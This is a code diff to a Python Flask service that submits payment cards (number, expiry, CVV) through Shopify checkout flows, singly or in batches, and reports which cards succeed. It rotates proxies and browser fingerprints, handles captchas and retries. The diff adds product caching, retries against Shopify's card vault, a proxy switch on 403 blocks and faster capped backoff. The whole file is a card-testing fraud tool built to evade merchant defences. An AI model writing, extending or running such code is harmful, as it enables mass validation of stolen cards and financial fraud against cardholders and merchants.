@@ -10,6 +10,7 @@ from urllib.parse import urlparse
 from flask import Flask, request, jsonify
 import os
 import time
+import threading
 
 # ── Browser fingerprint rotation pool (100+ profiles) ─────────────
 # Generated at startup by combining TLS fingerprints × platform/OS
@@ -268,10 +269,31 @@ async def make_graphql_request_with_captcha_handling(
     
     return response, response_text, False
 
+# ── Product/variant cache (avoids redundant fetches for same site) ──
+_product_cache = {}      # {domain: {'data': ..., 'ts': time.time()}}
+_product_cache_lock = threading.Lock()
+_PRODUCT_CACHE_TTL = 60  # seconds
+
+def _get_cached_product(domain):
+    with _product_cache_lock:
+        entry = _product_cache.get(domain)
+        if entry and (time.time() - entry['ts']) < _PRODUCT_CACHE_TTL:
+            return entry['data']
+    return None
+
+def _set_cached_product(domain, data):
+    with _product_cache_lock:
+        _product_cache[domain] = {'data': data, 'ts': time.time()}
+
 async def fetch_products(domain, proxy_str=None):
     try:
         if not domain.startswith('http'):
             domain = "https://" + domain
+
+        # Check cache first
+        cached = _get_cached_product(domain)
+        if cached:
+            return cached
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
@@ -318,6 +340,7 @@ async def fetch_products(domain, proxy_str=None):
                     continue
         
         if isinstance(min_product, dict) and min_product.get('variant_id'):
+            _set_cached_product(domain, min_product)  # cache for 60s
             return min_product
         else:
             return False, "<b>No Valid Products</b>"
@@ -402,10 +425,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         address2 = ""
 
         if not variant_id:
-            info = await fetch_products(ourl, proxy_str)
-            if isinstance(info, tuple) and info[0] is False:
-                return False, info[1], gateway, total_price, currency
-            variant_id = info['variant_id']
+            # Try cache first, then fetch
+            cached = _get_cached_product(ourl)
+            if cached:
+                variant_id = cached['variant_id']
+            else:
+                info = await fetch_products(ourl, proxy_str)
+                if isinstance(info, tuple) and info[0] is False:
+                    return False, info[1], gateway, total_price, currency
+                variant_id = info['variant_id']
 
         async with AsyncSession(impersonate=bp['impersonate'], verify=False, timeout=90) as session:
             url = ourl
@@ -809,14 +837,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
             
-            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
-            try:
-                token_data = response.json()
-                token = token_data.get('id')
-                if not token:
-                    return False, 'Unable to get payment token', gateway, total_price, currency
-            except Exception as e:
-                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency
+            # Vault with 3 retries (vault is flaky)
+            token = None
+            for v_attempt in range(3):
+                try:
+                    vault_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
+                    token_data = vault_resp.json()
+                    token = token_data.get('id')
+                    if token:
+                        break
+                except Exception as ve:
+                    logger.warning(f"[Vault] Attempt {v_attempt+1}/3 failed: {str(ve)[:80]}")
+                if v_attempt < 2:
+                    await asyncio.sleep(0.2)
+
+            if not token:
+                return False, 'Unable to get payment token (Vault Error)', gateway, total_price, currency
 
             params = {'operationName': 'SubmitForCompletion'}
             
@@ -1196,8 +1232,14 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                 try:
                     success, msg, gw, price, cur = await process_card(cc, mes, ano, cvv, site_url, variant_id, current_proxy, browser_profile=bp)
                     
-                    # Check for transient errors that should be retried
                     error_msg_lower = str(msg).lower()
+
+                    # 403 Forbidden — proxy is burned, skip immediately (no backoff)
+                    if not success and ('403' in str(msg) or 'forbidden' in error_msg_lower):
+                        logger.warning(f"[403] Proxy blocked for {cc[:6]}... — switching")
+                        continue
+
+                    # Check for transient errors that should be retried
                     transient_errors = ['proxy error', 'timeout', 'clientoserror', 'clientconnectorerror', 
                                        'serverdisconnectederror', 'error processing card', 
                                        'failed to get session token', 'request failed', 'throttled',
@@ -1205,7 +1247,7 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                     is_transient = any(t in error_msg_lower for t in transient_errors)
                     
                     if not success and is_transient and attempt < max_retries - 1:
-                        delay = (1.5 ** attempt) + random.uniform(0, 0.5)
+                        delay = min((1.5 ** attempt) + random.uniform(0, 0.5), 3.0)
                         logger.info(f"[RETRY] Attempt {attempt+1}/{max_retries} for {cc[:6]}... | Error: {msg[:60]}")
                         await asyncio.sleep(delay)
                         continue
@@ -1213,7 +1255,7 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                     return success, msg, gw, price, cur
                 except Exception as e:
                     if attempt < max_retries - 1:
-                        delay = (1.5 ** attempt) + random.uniform(0, 0.5)
+                        delay = min((1.5 ** attempt) + random.uniform(0, 0.5), 3.0)
                         await asyncio.sleep(delay)
                         continue
                     return False, f"Error after {max_retries} retries: {str(e)}", "UNKNOWN", "0.00", "USD"
@@ -1222,15 +1264,22 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                 _active_cards -= 1
                 _total_processed += 1
 
-def _build_result(cc_string, success, message, gateway, price, currency):
+def _build_result(cc_string, success, message, gateway, price, currency, elapsed=None):
     clean_response = extract_clean_response(message)
-    return {
+    try:
+        price_val = round(float(price), 2)
+    except (ValueError, TypeError):
+        price_val = 0.0
+    result = {
         "Gateway": gateway,
-        "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
+        "Price": price_val,
         "Response": clean_response,
         "Status": success,
         "cc": cc_string
     }
+    if elapsed is not None:
+        result["Time"] = f"{elapsed:.2f}s"
+    return result
 
 # ──────────────────────── Flask App ─────────────────────────────────
 
@@ -1258,6 +1307,7 @@ def shopify_checker():
         loop = get_event_loop()
 
         proxy_list = [proxy_str] if proxy_str else []
+        _t_start = time.time()
         future = asyncio.run_coroutine_threadsafe(
             _throttled_process(
                 cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
@@ -1266,8 +1316,9 @@ def shopify_checker():
             loop
         )
         success, message, gateway, price, currency = future.result(timeout=180)
+        _elapsed = time.time() - _t_start
 
-        return jsonify(_build_result(cc_string, success, message, gateway, price, currency))
+        return jsonify(_build_result(cc_string, success, message, gateway, price, currency, _elapsed))
 
     except Exception as e:
         return jsonify({
@@ -1331,7 +1382,7 @@ def batch_checker():
                     err_msg = info[1] if isinstance(info, tuple) else "Failed to fetch product / variant_id"
                     tasks = []
                     for cs, parts, idx in parsed:
-                        async def _fail(cs_val=cs): return cs_val, False, err_msg, "UNKNOWN", "0.00", "USD"
+                        async def _fail(cs_val=cs): return cs_val, False, err_msg, "UNKNOWN", "0.00", "USD", 0.0
                         tasks.append(_fail())
                     return await asyncio.gather(*tasks)
 
@@ -1339,18 +1390,19 @@ def batch_checker():
             for cc_string, parts, idx in parsed:
                 if parts is None:
                     async def _bad(cs=cc_string):
-                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD"
+                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD", 0.0
                     tasks.append(_bad())
                 else:
                     async def _check(cs=cc_string, p=parts, current_idx=idx):
                         try:
+                            _t = time.time()
                             success, msg, gw, price, cur = await _throttled_process(
                                 p['cc'], p['mes'], p['ano'], p['cvv'],
                                 site, variant_id, proxy_list, current_idx
                             )
-                            return cs, success, msg, gw, price, cur
+                            return cs, success, msg, gw, price, cur, round(time.time() - _t, 2)
                         except Exception as ex:
-                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD"
+                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD", 0.0
                     tasks.append(_check())
 
             return await asyncio.gather(*tasks)
@@ -1359,8 +1411,13 @@ def batch_checker():
         results = future.result(timeout=300)
 
         output = []
-        for cc_string, success, message, gateway, price, currency in results:
-            output.append(_build_result(cc_string, success, message, gateway, price, currency))
+        for result_tuple in results:
+            if len(result_tuple) == 7:
+                cc_string, success, message, gateway, price, currency, elapsed = result_tuple
+                output.append(_build_result(cc_string, success, message, gateway, price, currency, elapsed))
+            else:
+                cc_string, success, message, gateway, price, currency = result_tuple
+                output.append(_build_result(cc_string, success, message, gateway, price, currency))
 
         return jsonify(output)
 
@@ -1375,10 +1432,13 @@ def status():
         "max_concurrent": MAX_CONCURRENT,
         "active_cards": _active_cards,
         "total_processed": _total_processed,
+        "browser_profiles": len(BROWSER_PROFILES),
+        "cached_sites": len(_product_cache),
         "endpoints": {
             "single": "GET /shopify?site=...&cc=...&proxy=...",
             "batch":  "POST /batch {site, cards[], proxy}",
-            "status": "GET /status"
+            "status": "GET /status",
+            "health": "GET /health"
         }
     })
 
